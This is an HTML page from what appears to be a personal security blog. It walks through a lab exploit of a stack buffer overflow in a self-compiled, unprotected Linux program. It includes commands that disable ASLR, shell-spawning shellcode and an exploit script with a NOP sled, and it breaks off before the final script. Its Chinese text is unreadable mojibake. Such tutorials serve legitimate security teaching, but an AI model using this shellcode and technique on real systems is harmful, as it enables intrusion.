

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
  <title>Linux Buffer Overflow - Knight&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- Ëá™ÂÆö‰πâÊ†∑Âºè‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                È¶ñÈ°µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                ÂΩíÊ°£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                ÂàÜÁ±ª
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Ê†áÁ≠æ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                ÂÖ≥‰∫é
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/post.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Linux Buffer Overflow">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-07-07 00:00" pubdate>
        2022Âπ¥7Êúà7Êó• ÂáåÊô®
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      9.1k Â≠ó
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      172
       ÂàÜÈíü
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Linux Buffer Overflow</h1>
            
            <div class="markdown-body">
              <h1 id="Linux-Buffer-Overflow"><a href="#Linux-Buffer-Overflow" class="headerlink" title="Linux Buffer Overflow"></a>Linux Buffer Overflow</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/">https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/</a></p>
<p><a target="_blank" rel="noopener" href="https://samsclass.info/127/proj/lbuf1.htm">https://samsclass.info/127/proj/lbuf1.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://samsclass.info/127/proj/p3-lbuf1.htm">https://samsclass.info/127/proj/p3-lbuf1.htm</a> </p>
</blockquote>
<h2 id="Disabling-ASLR"><a href="#Disabling-ASLR" class="headerlink" title="Disabling ASLR"></a>Disabling ASLR</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/StackOverflowtest]<br>‚îî‚îÄ$ sudo su<br>[sudo] password for kali: <br>‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/kali/StackOverflowtest]<br>‚îî‚îÄ# echo 0 &gt; /proc/sys/kernel/randomize_va_space<br><br>‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/kali/StackOverflowtest]<br>‚îî‚îÄ# exit<br></code></pre></td></tr></table></figure>
<h2 id="Creating-a-Vulnerable-Program"><a href="#Creating-a-Vulnerable-Program" class="headerlink" title="Creating a Vulnerable Program"></a>Creating a Vulnerable Program</h2><p><strong>C Ê∫êÁ†ÅÔºö</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br>void main(int argc, char *argv[]) &#123;<br>    char buffer[100];<br>    strcpy(buffer, argv[1]);<br>    printf(&quot;Done!\n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<p><strong>ÁºñËØë„ÄÅÊâßË°åÔºö</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -fno-stack-protector -z execstack -no-pie -m32 -g -o bol bol.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./bol A</span><br>Done!<br></code></pre></td></tr></table></figure>
<h2 id="Overflowing-the-Stack"><a href="#Overflowing-the-Stack" class="headerlink" title="Overflowing the Stack"></a>Overflowing the Stack</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*116)&#x27;</span></span>               <br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./bol AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol <br></code></pre></td></tr></table></figure>
<h2 id="Debugging-the-Program"><a href="#Debugging-the-Program" class="headerlink" title="Debugging the Program"></a>Debugging the Program</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/283b5466684b">pedaÁöÑ‰ΩøÁî® - ÁÆÄ‰π¶ (jianshu.com)</a></p>
</blockquote>
<p>gdb-peda ÂÆâË£ÖÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"> #</span><span class="bash"> gdbÂ¶ÇÊûúÂÆâË£Ö‰∏ç‰∏äÔºåÂèØ‰ª•Êç¢Ê∫êÂÆâË£ÖÔºömirrors.tuna.tsinghua.edu.cn</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt install gdb</span><br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/longld/peda.git ~/peda</span> <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span> <br></code></pre></td></tr></table></figure>
<p>gdb ËøêË°åË∞ÉËØïÔºålist ÂèØ‰ª•Êü•Áúã C ËØ≠Ë®ÄÊ∫êÁ†ÅÔºåbreak Ê∑ªÂä†Êñ≠ÁÇπ </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol</span><br>Reading symbols from bol...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x80491ad: file bol.c, line 6.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
<p>Âõ†‰∏∫Ê∫¢Âá∫ÁÇπÂú® <code>strcpy()</code> ÂáΩÊï∞ÔºåÊâÄ‰ª•Âú®Á¨¨ÂÖ≠Ë°åÊâìÊñ≠ÁÇπÔºåÊü•ÁúãÊ∫¢Âá∫ÂêéÊ†àÁöÑÊÉÖÂÜµÂíåÂØÑÂ≠òÂô®ÁöÑÊÉÖÂÜµ„ÄÇ</p>
<h3 id="Normal-Execution"><a href="#Normal-Execution" class="headerlink" title="Normal Execution"></a>Normal Execution</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run A</span><br>Starting program: /home/kali/StackOverflowtest/bol A<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd38c --&gt; 0x4f430041 (&#x27;A&#x27;)<br>EDX: 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd0e8 --&gt; 0x0 <br>ESP: 0xffffd070 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd070 --&gt; 0x0 <br>0004| 0xffffd074 --&gt; 0x1 <br>0008| 0xffffd078 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>0016| 0xffffd080 --&gt; 0x0 <br>0020| 0xffffd084 --&gt; 0x0 <br>0024| 0xffffd088 --&gt; 0x0 <br>0028| 0xffffd08c --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x2, argv=0xffffd1a4) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd07c          0xffffd07c<br>ecx            0xffffd38c          0xffffd38c<br>edx            0xffffd07c          0xffffd07c<br>ebx            0x804c000           0x804c000<br>esp            0xffffd070          0xffffd070<br>ebp            0xffffd0e8          0xffffd0e8<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x282               [ SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd070:     0x00000000      0x00000001      0xf7ffd9d0      0x00000041<br>0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000<br>0xffffd090:     0x00000000      0x00000000      0xf7ffd000      0x00000000<br>0xffffd0a0:     0x08049060      0xf7fc9550      0x08048034      0xf7fa8a08<br>0xffffd0b0:     0x00000002      0xf7fdc480      0x00000000      0xf7df38ce<br>0xffffd0c0:     0xf7fa73fc      0xffffffff      0x08049060      0x0804921b<br>0xffffd0d0:     0x00000002      0xffffd1a4      0xffffd1b0      0x080491ed<br>0xffffd0e0:     0xffffd100      0x00000000      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0x08049060      0x00000000      0xf7dda905<br>0xffffd100:     0x00000002      0xffffd1a4      0xffffd1b0      0xffffd134<br></code></pre></td></tr></table></figure>
<h3 id="Overflowing-the-Stack-1"><a href="#Overflowing-the-Stack-1" class="headerlink" title="Overflowing the Stack"></a>Overflowing the Stack</h3><p><strong>‰ΩøÁî® 116 ‰∏™ A ËøõË°åÊµãËØïÔºö</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*116)&#x27;</span>)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
<p><strong>‰ΩøÁî® 112 ‰∏™ A Âíå 4 ‰∏™ B ËøõË°åÊµãËØïÔºö</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*112+&quot;B&quot;*4)&#x27;</span>)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x42424242<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
<p>ËøîÂõûÂú∞ÂùÄÂèòÊàê‰∫Ü 0x42424242ÔºàBBBBÔºâ</p>
<h2 id="Constructing-the-Exploit"><a href="#Constructing-the-Exploit" class="headerlink" title="Constructing the Exploit"></a>Constructing the Exploit</h2><h3 id="Getshellcode"><a href="#Getshellcode" class="headerlink" title="Getshellcode"></a>Getshellcode</h3><p>For this project, I am using shellcode that spawns a ‚Äúdash‚Äù shell from this page:</p>
<p><a target="_blank" rel="noopener" href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</a></p>
<p>The shellcode used to spawn a ‚Äúdash‚Äù shell is as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"># This shellcode is <span class="hljs-number">32</span> bytes <span class="hljs-keyword">long</span>.<br>\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80<br></code></pre></td></tr></table></figure>
<h3 id="Nop"><a href="#Nop" class="headerlink" title="Nop"></a>Nop</h3><p>There are some imperfections in the debugger, so an exploit that works in gdb may fail in a real Linux shell. This happens because environment variables and other details may cause the location of the stack to change slightly.</p>
<p>The usual solution for this problem is a NOP Sled‚Äîa long series of ‚Äú90‚Äù bytes, which do nothing when processed and proceed to the next instruction.</p>
<p>For this exploit, we‚Äôll use a 64-byte NOP Sled.</p>
<h3 id="Constructing-the-Exploit-1"><a href="#Constructing-the-Exploit-1" class="headerlink" title="Constructing the Exploit"></a>Constructing the Exploit</h3><p><strong>a.pyÔºö</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode = (<br><span class="hljs-string">b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27;</span> +<br><span class="hljs-string">b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27;</span> +<br><span class="hljs-string">b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;</span><br>)<br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">64</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">112</span> - <span class="hljs-number">64</span> - <span class="hljs-number">32</span>)<br>eip = <span class="hljs-string">b&#x27;1234&#x27;</span><br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure>
<h2 id="Testing-Exploit-in-gdb"><a href="#Testing-Exploit-in-gdb" class="headerlink" title="Testing Exploit in gdb"></a>Testing Exploit in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 a.py)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xw <span class="hljs-variable">$esp</span></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x34333231<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br></code></pre></td></tr></table></figure>
<p>Choosing an Address and Inserting the Correct Address Into the Exploit</p>
<p><strong>b.pyÔºö</strong></p>
